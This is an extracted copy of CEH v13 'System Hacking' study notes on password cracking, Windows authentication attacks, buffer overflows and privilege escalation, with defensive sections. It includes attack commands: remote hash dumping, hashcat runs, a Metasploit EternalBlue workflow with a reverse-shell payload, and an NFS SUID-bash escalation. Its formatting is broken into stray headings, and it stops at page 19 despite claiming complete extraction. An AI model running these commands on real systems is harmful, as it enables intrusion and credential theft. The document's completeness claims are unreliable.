# 📜 07. Full PDF Reference — System Hacking

> [!INFO] 🏛️ **Official CEH v13 PDF Source Master Repository**
> Cleaned, high-readability technical text extraction directly from official CEH v13 Syllabus PDF (`CEH_v13__Module_06_System_Hacking.pdf`). Formatted as structured Markdown prose with proper paragraphs, section headers, and key term highlights.

---

## 📊 Syllabus Metadata & Source Breakdown

> [!ABSTRACT] 📋 **Comprehensive PDF Syllabus Metadata Reference Matrix**

| Metadata Attribute | Syllabus Parameter Value |
| :--- | :--- |
| **Course Module** | **Module 06: System Hacking** |
| **Source PDF File** | `CEH_v13__Module_06_System_Hacking.pdf` |
| **Total Extracted Pages** | `41 Pages` |
| **Formatting Standard** | Ultra-Readable Markdown Prose & Structured Headings |
| **Extraction Status** | 100% Complete / Verified Text Flow |

---

## 📑 Structured & Readable Syllabus Reference

> [!NOTE]- 📄 **Pages 1 to 5 Syllabus Content**
>
> ### 📍 Page 1
>
> 
> #### 🔹 💻
> 
> 
> 
> #### 🔹 Hacking
> 
> 
> 
> #### 🔹 System Hacking
> 
> 
> 
> #### 🔹 📋Module Overview
> 
> 
> This module covers system hacking techniques from gaining initial access through privilege escalation, maintaining persistence, and covering tracks. Topics include password cracking, vulnerability exploitation, buffer overflows, privilege escalation methods, backdoors, rootkits, steganography, and anti-forensics techniques.
> 
> 
> #### 🔹 1. Gaining Access
> 
> 
> 
> #### 🔹 1.1 Password Cracking Concepts
> 
> 
> 
> #### 🔹 🔑Password Cracking Fundamentals
> 
> 
> Password cracking is the process of recovering passwords from data
> 
> 
> #### 🔹 stored or transmitted by computer systems. Understanding
> 
> 
> authentication mechanisms and hash storage is critical for both offensive and defensive security.
> 
> 
> #### 🔹 Microsoft Authentication
> 
> 
> 
> #### 🔹 Windows authentication relies on several key components:
> 
> 
> 
> #### 🔹 Core Components:
> 
>
> ---
>
> ### 📍 Page 2
>
> Local Security Authority LSA  Central authentication authority Security Accounts Manager SAM database  Local account storage
> 
> 
> #### 🔹 NTLM / NTLMv2  Challenge-response authentication protocol
> 
> 
> Kerberos  Default authentication in Active Directory environments
> 
> 
> #### 🔹 Password Hash Storage in Windows SAM
> 
> 
> 
> #### 🔹 SAM Database:
> 
> 
> 
> #### 🔹 Location: C\Windows\System32\Config\SAM
> 
> 
> 
> #### 🔹 Protection: Encrypted with SYSKEY/BOOTKEY
> 
> 
> 
> #### 🔹 Hash Format: NTLM hashes MD4-based)
> 
> 
> Storage: Passwords never stored in plaintext, only cryptographic hashes
> 
> 
> #### 🔹 Extracting Hashes:
> 
> 
> 
> #### 🔹 To read the SAM file, attackers must:
> 
> 
> 
> #### 🔹 Obtain both SYSTEM and SAM registry hives
> 
> 
> 
> #### 🔹 Extract from Volume Shadow Copy Service VSS
> 
> 
> 
> #### 🔹 Access offline (boot from external media)
> 
> 
> 
> #### 🔹 Dump from LSASS process memory
> 
> 
> 
> #### 🔹 Tools to Extract Password Hashes
> 
> 
> 
> #### 🔹 Mimikatz
> 
> 
> 
> #### 🔹 The most powerful credential extraction tool
> 
> 
> 
> #### 🔹 Dumps LSASS memory
> 
> 
> 
> #### 🔹 Extracts plaintext passwords, hashes, PINs, and tickets
> 
> 
> 
> #### 🔹 Performs pass-the-hash and pass-the-ticket attacks
> 
> 
> 
> #### 🔹 Impacket secretsdump.py
> 
> 
> 
> #### 🔹 Remote hash extraction via SMB
> 
> 
> 
> #### 🔹 secretsdump.py DOMAIN/user:password@target
> 
> 
> 
> #### 🔹 Additional Tools:
> 
>
> ---
>
> ### 📍 Page 3
>
> 
> #### 🔹 PwDump  Legacy SAM dumping tool
> 
> 
> 
> #### 🔹 HashDump Metasploit)  Framework integration
> 
> 
> Windows Credential Editor  In-memory credential manipulation
> 
> 
> #### 🔹 Cain & Abel  Comprehensive password recovery suite
> 
> 
> 
> #### 🔹 1.2 NTLM Authentication Process
> 
> 
> 
> #### 🔹 NTLM Challenge-Response:
> 
> 
> 
> #### 🔹  Client sends username to server
> 
> 
> 
> #### 🔹  Server sends challenge (random nonce)
> 
> 
> 
> #### 🔹  Client encrypts challenge with NT hash
> 
> 
> 
> #### 🔹  Server verifies challenge-response
> 
> 
> 
> #### 🔹 ⚠NTLM Vulnerabilities
> 
> 
> 
> #### 🔹 NTLM is susceptible to several attacks:
> 
> 
> 
> #### 🔹 Pass-the-Hash  Authentication using hash without plaintext
> 
> 
> 
> #### 🔹 password
> 
> 
> 
> #### 🔹 NTLM Relay  Forwarding authentication to another service
> 
> 
> 
> #### 🔹 Downgrade attacks  Forcing weaker authentication
> 
> 
> 
> #### 🔹 1.3 Kerberos Authentication
> 
> 
> 
> #### 🔹 Kerberos Components:
> 
> 
> 
> #### 🔹 ASREQ / ASREP  Authentication Service Request/Reply
> 
> 
> 
> #### 🔹 TGT Ticket Granting Ticket)  Initial authentication token
> 
> 
> 
> #### 🔹 Service tickets  Access tokens for specific services
> 
> 
> KDC Key Distribution Center)  Central authentication server
> 
> 
> #### 🔹 Kerberos Weaknesses:
> 
> 
> 
> #### 🔹 Kerberoasting  Service ticket encryption cracked offline
> 
> 
> 
> #### 🔹 ASREP Roasting  Exploiting accounts without Kerberos pre-
> 
> 
> 
> #### 🔹 authentication
> 
>
> ---
>
> ### 📍 Page 4
>
> 
> #### 🔹 Golden Ticket  Forging TGTs with KRBTGT hash
> 
> 
> 
> #### 🔹 Silver Ticket  Forging service tickets
> 
> 
> 
> #### 🔹 1.4 Password Attack Types
> 
> 
> 
> #### 🔹 Non-Electronic Attacks
> 
> 
> 
> #### 🔹 Physical and Social Methods:
> 
> 
> 
> #### 🔹 Shoulder surfing  Observing password entry
> 
> 
> 
> #### 🔹 Dumpster diving  Recovering discarded credentials
> 
> 
> 
> #### 🔹 Social engineering  Manipulating users to reveal passwords
> 
> 
> Guessing  Using personal information (birthdays, names, etc.)
> 
> 
> #### 🔹 Active Online Attacks
> 
> 
> 
> #### 🔹 Direct Authentication Attempts:
> 
> 
> 
> #### 🔹 Brute force  Trying all possible combinations
> 
> 
> Password spraying  Trying common passwords across many accounts Credential stuffing  Using leaked credentials from breaches Exploiting weak lockout policies  Avoiding account lockouts
> 
> 
> #### 🔹 Passive Online Attacks
> 
> 
> 
> #### 🔹 Interception and Monitoring:
> 
> 
> Network sniffing  Capturing cleartext credentials HTTP, FTP, Telnet)
> 
> 
> #### 🔹 Man-in-the-Middle MITM  Passive credential capture
> 
> 
> 
> #### 🔹 Protocol downgrade  Forcing weaker encryption
> 
> 
> 
> #### 🔹 Session hijacking  Stealing authenticated sessions
> 
> 
> 
> #### 🔹 Offline Attacks
> 
> 
> 
> #### 🔹 Hash-Based Cracking:
> 
> 
> 
> #### 🔹 Once attackers obtain password hashes:
> 
> 
> 
> #### 🔹 LM/NTLM cracking  Cracking Windows hashes
> 
> 
> 
> #### 🔹 Kerberoasting  Cracking service account passwords
> 
>
> ---
>
> ### 📍 Page 5
>
> 
> #### 🔹 Rainbow tables  Pre-computed hash lookups
> 
> 
> 
> #### 🔹 WPA handshake cracking  Wireless password recovery
> 
> 
> 
> #### 🔹 1.5 Password Cracking Techniques
> 
> 
> 
> #### 🔹 Brute Force
> 
> 
> 
> #### 🔹 Systematically trying all possible character combinations
> 
> 
> 
> #### 🔹 Guaranteed success but time-consuming
> 
> 
> 
> #### 🔹 Exponentially slower with password length
> 
> 
> 
> #### 🔹 Dictionary Attacks
> 
> 
> 
> #### 🔹 Using wordlists of common passwords
> 
> 
> 
> #### 🔹 Fast and effective against weak passwords
> 
> 
> 
> #### 🔹 Wordlists: rockyou.txt, common passwords, leaked databases
> 
> 
> 
> #### 🔹 Rule-Based Mutation
> 
> 
> 
> #### 🔹 Applying transformation rules to dictionary words
> 
> 
> 
> #### 🔹 Substitutions (a→@, e→3, i→1, o→0
> 
> 
> 
> #### 🔹 Capitalization patterns
> 
> 
> 
> #### 🔹 Appending numbers and symbols
> 
> 
> 
> #### 🔹 Rainbow Tables
> 
> 
> 
> #### 🔹 Pre-computed hash tables for instant lookup
> 
> 
> 
> #### 🔹 Trades storage space for computation time
> 
> 
> 
> #### 🔹 Ineffective against salted hashes
> 
> 
> 
> #### 🔹 Hybrid Attacks
> 
> 
> 
> #### 🔹 Combining dictionary and brute force methods
> 
> 
> 
> #### 🔹 Dictionary words with numeric/symbol suffixes
> 
> 
> 
> #### 🔹 Common patterns with variations
> 
> 
> 
> #### 🔹 1.6 Password Cracking Tools
> 
> 
> 
> #### 🔹 Hashcat
> 
> 
> 
> #### 🔹 The world's fastest password cracker
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 6 to 10 Syllabus Content**
>
> ### 📍 Page 6
>
> 
> #### 🔹 hashcat -m 1000 -a 0 hashes.txt rockyou.txt
> 
> 
> 
> #### 🔹 Supports GPU acceleration and numerous hash types
> 
> 
> 
> #### 🔹 John the Ripper
> 
> 
> 
> #### 🔹 Versatile password cracker with automatic hash detection
> 
> 
> 
> #### 🔹 john --wordlist=rockyou.txt hashes.txt
> 
> 
> 
> #### 🔹 Additional Tools:
> 
> 
> 
> #### 🔹 Cain & Abel  Windows password recovery
> 
> 
> 
> #### 🔹 Hydra  Network protocol brute forcing
> 
> 
> 
> #### 🔹 Medusa  Parallel network login cracker
> 
> 
> 
> #### 🔹 RainbowCrack  Rainbow table generation and cracking
> 
> 
> 
> #### 🔹 1.7 Password Recovery Tools
> 
> 
> 
> #### 🔹 Specialized Recovery:
> 
> 
> 
> #### 🔹 Ophcrack  Rainbow table-based Windows password cracker
> 
> 
> 
> #### 🔹 Trinity Rescue Kit  Bootable password reset toolkit
> 
> 
> Windows Password Recovery Tools  Commercial recovery solutions
> 
> 
> #### 🔹 Kon-Boot  Bypass Windows authentication
> 
> 
> 
> #### 🔹 1.8 Password Salting
> 
> 
> 
> #### 🔹 🧂Salt Definition
> 
> 
> A salt is a random value added to each password before hashing. Even identical passwords produce different hashes when different salts are used.
> 
> 
> #### 🔹 Salt Benefits:
> 
> 
> 
> #### 🔹 Prevents rainbow table attacks
> 
> 
> 
> #### 🔹 Eliminates hash collision detection
> 
>
> ---
>
> ### 📍 Page 7
>
> 
> #### 🔹 Forces attackers to crack each password individually
> 
> 
> 
> #### 🔹 Makes pre-computation attacks infeasible
> 
> 
> 
> #### 🔹 1.9 Defending Against Password Cracking
> 
> 
> 
> #### 🔹 Technical Controls:
> 
> 
> Enforce strong password policies  Minimum length, complexity
> 
> 
> #### 🔹 requirements
> 
> 
> Implement Multi-Factor Authentication MFA  Additional authentication
> 
> 
> #### 🔹 factors
> 
> 
> 
> #### 🔹 Disable LM hashes  Remove legacy weak hashing
> 
> 
> 
> #### 🔹 Use salted hashing — bcrypt, scrypt, Argon2
> 
> 
> 
> #### 🔹 Account lockout policies  Limit failed login attempts
> 
> 
> 
> #### 🔹 Protocol Hardening:
> 
> 
> 
> #### 🔹 Disable NTLM where possible  Use Kerberos exclusively
> 
> 
> 
> #### 🔹 Enforce NTLMv2  Disable legacy NTLMv1
> 
> 
> 
> #### 🔹 Enable SMB signing  Prevent relay attacks
> 
> 
> 
> #### 🔹 1.10 Defending Against LLMNR/NBT-NS Poisoning
> 
> 
> 
> #### 🔹 LLMNR/NBTNS Attacks:
> 
> 
> Link-Local Multicast Name Resolution and NetBIOS Name Service are fallback protocols vulnerable to spoofing attacks (using tools like Responder).
> 
> 
> #### 🔹 Mitigations:
> 
> 
> 
> #### 🔹 Disable LLMNR via Group Policy
> 
> 
> 
> #### 🔹 Disable NBTNS in network adapter settings
> 
> 
> 
> #### 🔹 Implement DNSSEC for secure name resolution
> 
> 
> 
> #### 🔹 Use WPA2/WPA3 Enterprise with 802.1X authentication
> 
> 
> 
> #### 🔹 Network segmentation to limit broadcast domains
> 
> 
> 
> #### 🔹 Detection Tools:
> 
> 
> 
> #### 🔹 Responder Guard  LLMNR/NBTNS poisoning detection
> 
>
> ---
>
> ### 📍 Page 8
>
> 
> #### 🔹 Snort/Suricata  IDS rules for poisoning attempts
> 
> 
> Microsoft Defender for Identity  Alert on suspicious authentication
> 
> 
> #### 🔹 NBTScan  Network monitoring for NetBIOS activity
> 
> 
> 
> #### 🔹 1.11 Detecting SMB Attacks Against Windows
> 
> 
> 
> #### 🔹 SMB Attack Types:
> 
> 
> 
> #### 🔹 SMB relay  Forwarding authentication to other hosts
> 
> 
> 
> #### 🔹 Pass-the-hash  Using NTLM hashes without passwords
> 
> 
> 
> #### 🔹 NTLM relay  Exploiting weak SMB signing
> 
> 
> 
> #### 🔹 Detection Methods:
> 
> 
> 
> #### 🔹 Event ID 4624/4625  Logon success/failure patterns
> 
> 
> 
> #### 🔹 Event ID 4768/4769  Kerberos ticket anomalies
> 
> 
> 
> #### 🔹 SIEM correlation rules  Detecting lateral movement
> 
> 
> 
> #### 🔹 Honeypot accounts  Alerting on unauthorized access
> 
> 
> 
> #### 🔹 SMB signing validation  Monitoring for unsigned traffic
> 
> 
> 
> #### 🔹 2. Vulnerability Exploitation
> 
> 
> 
> #### 🔹 2.1 Exploit Resources and Sites
> 
> 
> 
> #### 🔹 Exploit Repositories:
> 
> 
> 
> #### 🔹 Exploit-DB  Comprehensive exploit database
> 
> 
> Rapid7 Vulnerability & Exploit Database  Metasploit integration
> 
> 
> #### 🔹 Packet Storm  Security tools and exploits
> 
> 
> 
> #### 🔹 GitHub PoCs  Proof-of-concept exploits
> 
> 
> 
> #### 🔹 0day.today  Zero-day exploit marketplace
> 
> 
> 
> #### 🔹 2.2 Windows Exploit Suggester – Next Generation
> 
> 
> 
> #### 🔹 (WES-NG)
> 
> 
> 
> #### 🔹 Functionality:
> 
>
> ---
>
> ### 📍 Page 9
>
> Compares installed patches against Microsoft security bulletins
> 
> 
> #### 🔹 Identifies missing security updates
> 
> 
> 
> #### 🔹 Suggests applicable CVEs for exploitation
> 
> 
> 
> #### 🔹 Prioritizes exploits by severity and reliability
> 
> 
> 
> #### 🔹 Usage:
> 
> 
> 
> #### 🔹 wes.py systeminfo.txt
> 
> 
> 
> #### 🔹 2.3 Metasploit Framework
> 
> 
> 
> #### 🔹 🛠Metasploit Overview
> 
> 
> The Metasploit Framework is the world's most popular penetration testing platform, providing a modular architecture for developing, testing, and executing exploits.
> 
> 
> #### 🔹 Core Modules:
> 
> 
> 
> #### 🔹 Exploits
> 
> 
> 
> #### 🔹 Code that takes advantage of vulnerabilities
> 
> 
> 
> #### 🔹 Payloads
> 
> 
> 
> #### 🔹 Code executed after successful exploitation
> 
> 
> 
> #### 🔹 Singles (self-contained)
> 
> 
> 
> #### 🔹 Stagers (establish connection)
> 
> 
> 
> #### 🔹 Stages (downloaded after staging)
> 
> 
> 
> #### 🔹 Auxiliary
> 
> 
> 
> #### 🔹 Scanning, fuzzing, and reconnaissance modules
> 
> 
> 
> #### 🔹 Post
> 
> 
> Post-exploitation modules for privilege escalation and data collection
> 
> 
> #### 🔹 Encoders
> 
> 
> 
> #### 🔹 Encode payloads to evade detection
> 
> 
> 
> #### 🔹 NOPs
> 
>
> ---
>
> ### 📍 Page 10
>
> 
> #### 🔹 No-operation instructions for buffer alignment
> 
> 
> 
> #### 🔹 Basic Workflow:
> 
> 
> 
> #### 🔹 msfconsole
> 
> 
> 
> #### 🔹 use exploit/windows/smb/ms17_010_eternalblue
> 
> 
> 
> #### 🔹 set RHOSTS 192.168.1.10
> 
> 
> 
> #### 🔹 set PAYLOAD windows/x64/meterpreter/reverse_tcp
> 
> 
> 
> #### 🔹 set LHOST 192.168.1.100
> 
> 
> 
> #### 🔹 exploit
> 
> 
> 
> #### 🔹 2.4 AI-Powered Vulnerability Exploitation Tools
> 
> 
> 
> #### 🔹 AI Capabilities in Exploitation:
> 
> 
> Automatic exploit selection  Matching vulnerabilities to exploits
> 
> 
> #### 🔹 Payload crafting  Generating custom payloads
> 
> 
> 
> #### 🔹 Banner analysis  Identifying exploitable services
> 
> 
> 
> #### 🔹 EDR evasion suggestions  Bypassing endpoint protection
> 
> 
> 
> #### 🔹 Exploit chaining  Combining multiple vulnerabilities
> 
> 
> 
> #### 🔹 2.5 Buffer Overflow Fundamentals
> 
> 
> 
> #### 🔹 What is a Buffer Overflow?
> 
> 
> A buffer overflow occurs when a program writes data beyond the allocated buffer memory, potentially overwriting adjacent memory locations including the instruction pointer.
> 
> 
> #### 🔹 Types of Buffer Overflow
> 
> 
> 
> #### 🔹 Stack Overflow
> 
> 
> 
> #### 🔹 Overwriting the call stack, including return addresses
> 
> 
> 
> #### 🔹 Most common type
> 
> 
> 
> #### 🔹 Allows control of execution flow
> 
> 
> 
> #### 🔹 Heap Overflow
> 
> 
> 
> #### 🔹 Overwriting dynamically allocated heap memory
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 11 to 15 Syllabus Content**
>
> ### 📍 Page 11
>
> 
> #### 🔹 More complex to exploit
> 
> 
> 
> #### 🔹 Can corrupt data structures and function pointers
> 
> 
> 
> #### 🔹 Format String Attacks
> 
> 
> Exploiting format string vulnerabilities in printf-family functions
> 
> 
> #### 🔹 Read/write arbitrary memory
> 
> 
> 
> #### 🔹 Execute arbitrary code
> 
> 
> 
> #### 🔹 Integer Overflow
> 
> 
> 
> #### 🔹 Arithmetic operations exceeding integer limits
> 
> 
> 
> #### 🔹 Can lead to buffer overflows
> 
> 
> 
> #### 🔹 Memory corruption vulnerabilities
> 
> 
> 
> #### 🔹 2.6 Simple Buffer Overflow Example
> 
> 
> 
> #### 🔹 Vulnerable C Code:
> 
> 
> 
> #### 🔹 #include <string.h>
> 
> 
> 
> #### 🔹 void vulnerable_function(char *input) {
> 
> 
> 
> #### 🔹 char buffer[64];
> 
> 
> 
> #### 🔹 strcpy(buffer, input);  // No bounds checking!
> 
> 
> 
> #### 🔹 }
> 
> 
> 
> #### 🔹 Exploitation:
> 
> 
> 
> #### 🔹 Input exceeding 64 bytes overflows buffer
> 
> 
> 
> #### 🔹 Overwrites stack data
> 
> 
> 
> #### 🔹 Can overwrite return address
> 
> 
> 
> #### 🔹 Redirects execution to attacker-controlled code
> 
> 
> 
> #### 🔹 2.7 Windows Buffer Overflow Exploitation Process
> 
> 
> 
> #### 🔹 Exploitation Steps:
> 
> 
> 
> #### 🔹 1. Crash the Application
> 
> 
> 
> #### 🔹 Identify crash point with oversized input
> 
>
> ---
>
> ### 📍 Page 12
>
> 
> #### 🔹 2. Control EIP Instruction Pointer)
> 
> 
> 
> #### 🔹 Determine offset to overwrite return address
> 
> 
> 
> #### 🔹 3. Identify Bad Characters
> 
> 
> 
> #### 🔹 Find characters that break exploit (null bytes, newlines)
> 
> 
> 
> #### 🔹 4. Locate JMP ESP
> 
> 
> 
> #### 🔹 Find instruction to jump to stack-based shellcode
> 
> 
> 
> #### 🔹 5. Craft Shellcode
> 
> 
> 
> #### 🔹 Generate payload (reverse shell, bind shell, meterpreter)
> 
> 
> 
> #### 🔹 6. Execute Exploit
> 
> 
> 
> #### 🔹 Deliver exploit and gain control
> 
> 
> 
> #### 🔹 2.8 Return-Oriented Programming (ROP)
> 
> 
> 
> #### 🔹 ROP Technique:
> 
> 
> Uses small instruction sequences called "gadgets" ending in return instructions to bypass DEP/NX protections.
> 
> 
> #### 🔹 ROP Gadgets:
> 
> 
> 
> #### 🔹 pop eax; ret
> 
> 
> 
> #### 🔹 pop ebx; ret
> 
> 
> 
> #### 🔹 mov [eax], ebx; ret
> 
> 
> 
> #### 🔹 ROP Chain:
> 
> 
> String together gadgets to perform arbitrary operations without injecting new code.
> 
> 
> #### 🔹 2.9 Bypassing ASLR and DEP
> 
> 
> 
> #### 🔹 Address Space Layout Randomization ASLR
> 
> 
> 
> #### 🔹 Randomizes memory addresses to prevent exploitation
> 
> 
> 
> #### 🔹 Data Execution Prevention DEP/NX
> 
> 
> 
> #### 🔹 Marks memory regions as non-executable
> 
> 
> 
> #### 🔹 Bypass Techniques:
> 
> 
> 
> #### 🔹 Heap Spraying
> 
>
> ---
>
> ### 📍 Page 13
>
> 
> #### 🔹 Fill memory with NOP sleds and shellcode
> 
> 
> 
> #### 🔹 JIT Spraying
> 
> 
> 
> #### 🔹 Abuse Just-In-Time compilation
> 
> 
> 
> #### 🔹 Information Leakage
> 
> 
> 
> #### 🔹 Leak memory addresses to defeat ASLR
> 
> 
> 
> #### 🔹 ROP Chains
> 
> 
> 
> #### 🔹 Execute code using existing instructions
> 
> 
> 
> #### 🔹 Return-to-libc
> 
> 
> 
> #### 🔹 Call existing library functions
> 
> 
> 
> #### 🔹 2.10 Exploit Chaining
> 
> 
> 
> #### 🔹 Combining Multiple Exploits:
> 
> 
> 
> #### 🔹 Initial access vulnerability
> 
> 
> 
> #### 🔹 Privilege escalation exploit
> 
> 
> 
> #### 🔹 Lateral movement technique
> 
> 
> 
> #### 🔹 Persistence mechanism
> 
> 
> 
> #### 🔹 Multi-Stage Payloads:
> 
> 
> 
> #### 🔹 Stage 1 Small loader
> 
> 
> 
> #### 🔹 Stage 2 Full payload delivery
> 
> 
> 
> #### 🔹 Stage 3 Post-exploitation modules
> 
> 
> 
> #### 🔹 2.11 Post-AD Enumeration Using PowerView
> 
> 
> 
> #### 🔹 PowerView Capabilities:
> 
> 
> 
> #### 🔹 # Enumerate domain users
> 
> 
> 
> #### 🔹 Get-NetUser
> 
> 
> 
> #### 🔹 # Find domain admins
> 
> 
> 
> #### 🔹 Get-NetGroupMember "Domain Admins"
> 
> 
> 
> #### 🔹 # Identify misconfgured ACLs
> 
>
> ---
>
> ### 📍 Page 14
>
> 
> #### 🔹 Find-InterestingDomainAcl
> 
> 
> 
> #### 🔹 # Locate high-value targets
> 
> 
> 
> #### 🔹 Invoke-UserHunter
> 
> 
> 
> #### 🔹 # Find shares
> 
> 
> 
> #### 🔹 Invoke-ShareFinder
> 
> 
> 
> #### 🔹 2.12 Security Assessment with GhostPack Seatbelt
> 
> 
> 
> #### 🔹 Seatbelt Functions:
> 
> 
> 
> #### 🔹 Security audit and enumeration
> 
> 
> 
> #### 🔹 Token information collection
> 
> 
> 
> #### 🔹 Lateral movement indicator detection
> 
> 
> 
> #### 🔹 Credential harvesting detection
> 
> 
> 
> #### 🔹 System configuration analysis
> 
> 
> 
> #### 🔹 Usage:
> 
> 
> 
> #### 🔹 Seatbelt.exe -group=all
> 
> 
> 
> #### 🔹 2.13 Buffer Overflow Detection Tools
> 
> 
> 
> #### 🔹 Analysis Tools:
> 
> 
> 
> #### 🔹 Valgrind  Memory debugging and profiling
> 
> 
> 
> #### 🔹 AddressSanitizer  Compile-time instrumentation
> 
> 
> Immunity Debugger  Windows debugger for exploit development
> 
> 
> #### 🔹 OllyDbg  Popular Windows debugger
> 
> 
> 
> #### 🔹 GDB with PEDA  Enhanced Linux debugging
> 
> 
> 
> #### 🔹 2.14 Defending Against Buffer Overflows
> 
> 
> 
> #### 🔹 Secure Coding Practices:
> 
> 
> 
> #### 🔹 Use safe functions — strncpy(), snprintf(), strncat()
> 
>
> ---
>
> ### 📍 Page 15
>
> 
> #### 🔹 Input validation  Validate length and content
> 
> 
> 
> #### 🔹 Bounds checking  Verify array indices
> 
> 
> 
> #### 🔹 Compiler Protections:
> 
> 
> 
> #### 🔹 Stack canaries  Detect stack smashing
> 
> 
> 
> #### 🔹 ASLR  Randomize memory layout
> 
> 
> 
> #### 🔹 DEP/NX  Non-executable stack/heap
> 
> 
> -fstack-protector  GCC stack protection
> 
> 
> #### 🔹 Runtime Protections:
> 
> 
> 
> #### 🔹 Control Flow Guard CFG  Windows control flow integrity
> 
> 
> 
> #### 🔹 Shadow Stack  Hardware-assisted return address protection
> 
> 
> 
> #### 🔹 3. Privilege Escalation
> 
> 
> 
> #### 🔹 3.1 Privilege Escalation Concepts
> 
> 
> 
> #### 🔹 ⬆Privilege Escalation
> 
> 
> The process of exploiting vulnerabilities, misconfigurations, or design flaws to gain elevated access beyond initial compromise level.
> 
> 
> #### 🔹 Types:
> 
> 
> Vertical escalation  Low-privilege user to administrator/root Horizontal escalation  User access to another user's account
> 
> 
> #### 🔹 3.2 DLL Hijacking
> 
> 
> 
> #### 🔹 Attack Mechanism:
> 
> 
> If an application loads a DLL from a writable directory without using absolute paths, attackers can place a malicious DLL in the search path.
> 
> 
> #### 🔹 DLL Search Order Windows):
> 
> 
> 
> #### 🔹  Application directory
> 
> 
> 
> #### 🔹  System directory
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 16 to 20 Syllabus Content**
>
> ### 📍 Page 16
>
> 
> #### 🔹  Windows directory
> 
> 
> 
> #### 🔹  Current directory
> 
> 
> 
> #### 🔹  PATH environment variable directories
> 
> 
> 
> #### 🔹 Exploitation:
> 
> 
> Place malicious DLL in earlier search path location to intercept loading.
> 
> 
> #### 🔹 3.3 Vulnerability-Based Privilege Escalation
> 
> 
> 
> #### 🔹 Exploiting System Weaknesses:
> 
> 
> 
> #### 🔹 Unpatched operating systems  Using known kernel exploits
> 
> 
> 
> #### 🔹 Kernel vulnerabilities  Direct privilege escalation
> 
> 
> 
> #### 🔹 Service vulnerabilities  Exploiting privileged services
> 
> 
> 
> #### 🔹 Weak file permissions  Modifying system files
> 
> 
> 
> #### 🔹 3.4 Dylib Hijacking
> 
> 
> 
> #### 🔹 macOS DLL Hijacking:
> 
> 
> Similar to Windows DLL hijacking but targeting .dylib files on macOS systems.
> 
> 
> #### 🔹 Attack Vectors:
> 
> 
> 
> #### 🔹 Weak file permissions
> 
> 
> 
> #### 🔹 DYLD environment variables
> 
> 
> 
> #### 🔹 @rpath vulnerabilities
> 
> 
> 
> #### 🔹 3.5 Spectre and Meltdown Exploitation
> 
> 
> 
> #### 🔹 CPU Vulnerabilities:
> 
> 
> 
> #### 🔹 Spectre  Exploits speculative execution to leak memory
> 
> 
> 
> #### 🔹 Meltdown  Breaks isolation between user and kernel memory
> 
> 
> 
> #### 🔹 Privilege Escalation:
> 
> 
> Can read privileged memory from unprivileged processes.
> 
> 
> #### 🔹 3.6 Named Pipe Impersonation
> 
> 
> 
> #### 🔹 Windows Named Pipes:
> 
>
> ---
>
> ### 📍 Page 17
>
> Attackers can impersonate privileged clients connecting to named pipes.
> 
> 
> #### 🔹 Attack Process:
> 
> 
> 
> #### 🔹  Create named pipe
> 
> 
> 
> #### 🔹  Wait for privileged service connection
> 
> 
> 
> #### 🔹  Impersonate connecting token
> 
> 
> 
> #### 🔹  Perform actions with elevated privileges
> 
> 
> 
> #### 🔹 3.7 Misconfigured Services
> 
> 
> 
> #### 🔹 Common Misconfigurations:
> 
> 
> 
> #### 🔹 Weak Service Permissions
> 
> 
> 
> #### 🔹 Users can modify service configuration
> 
> 
> 
> #### 🔹 Writable Service Binary Path
> 
> 
> 
> #### 🔹 Replace legitimate binary with malicious one
> 
> 
> 
> #### 🔹 Unquoted Service Paths
> 
> 
> 
> #### 🔹 Exploit space-separated paths:
> 
> 
> 
> #### 🔹 C\Program Files\My Service\service.exe
> 
> 
> 
> #### 🔹 Windows tries:
> 
> 
> 
> #### 🔹 CProgram.exe
> 
> 
> 
> #### 🔹 CProgram FilesMy.exe
> 
> 
> 
> #### 🔹 Services Running as SYSTEM
> 
> 
> 
> #### 🔹 Maximum privilege if compromised
> 
> 
> 
> #### 🔹 3.8 Pivoting and Relaying
> 
> 
> 
> #### 🔹 Pivoting:
> 
> 
> 
> #### 🔹 Using compromised host to access other network segments
> 
> 
> 
> #### 🔹 Port forwarding
> 
> 
> 
> #### 🔹 SOCKS proxying
> 
> 
> 
> #### 🔹 Tunneling
> 
>
> ---
>
> ### 📍 Page 18
>
> 
> #### 🔹 Authentication Relaying:
> 
> 
> 
> #### 🔹 SMB relay attacks
> 
> 
> 
> #### 🔹 NTLM relay to other services
> 
> 
> 
> #### 🔹 Kerberos delegation abuse
> 
> 
> 
> #### 🔹 3.9 Misconfigured NFS Privilege Escalation
> 
> 
> 
> #### 🔹 NFS Vulnerabilities:
> 
> 
> 
> #### 🔹 Writable NFS shares with no_root_squash
> 
> 
> 
> #### 🔹 Allows root user on client to have root on share
> 
> 
> 
> #### 🔹 Exploitation:
> 
> 
> 
> #### 🔹 # Mount NFS share
> 
> 
> 
> #### 🔹 mount -t nfs target:/share /mnt/nfs
> 
> 
> 
> #### 🔹 # Create SUID binary
> 
> 
> 
> #### 🔹 cp /bin/bash /mnt/nfs/bash
> 
> 
> 
> #### 🔹 chmod +s /mnt/nfs/bash
> 
> 
> 
> #### 🔹 # Execute on target
> 
> 
> 
> #### 🔹 /share/bash -p
> 
> 
> 
> #### 🔹 3.10 Bypassing User Account Control (UAC)
> 
> 
> 
> #### 🔹 UAC Bypass Methods:
> 
> 
> 
> #### 🔹 DLL injection  Injecting into auto-elevated processes
> 
> 
> 
> #### 🔹 Token manipulation  Duplicating elevated tokens
> 
> 
> 
> #### 🔹 Auto-elevate programs  Hijacking trusted binaries
> 
> 
> 
> #### 🔹 COM elevation  Exploiting COM object elevation
> 
> 
> 
> #### 🔹 Registry manipulation  Modifying auto-elevate settings
> 
> 
> 
> #### 🔹 3.11 Boot and Logon Script Abuse
> 
> 
> 
> #### 🔹 Persistence and Escalation:
> 
>
> ---
>
> ### 📍 Page 19
>
> 
> #### 🔹 Modify logon scripts to execute malicious code
> 
> 
> 
> #### 🔹 Inject into startup scripts
> 
> 
> 
> #### 🔹 GPO logon script modification
> 
> 
> 
> #### 🔹 User profile script abuse
> 
> 
> 
> #### 🔹 3.12 Domain Policy Modification
> 
> 
> 
> #### 🔹 Group Policy Exploitation:
> 
> 
> 
> #### 🔹 Edit GPO to run malicious scripts on all domain machines
> 
> 
> 
> #### 🔹 Scheduled task creation via GPO
> 
> 
> 
> #### 🔹 Software installation via GPO
> 
> 
> 
> #### 🔹 Startup/shutdown script modification
> 
> 
> 
> #### 🔹 3.13 DCSync Attack
> 
> 
> 
> #### 🔹 🔄DCSync Attack
> 
> 
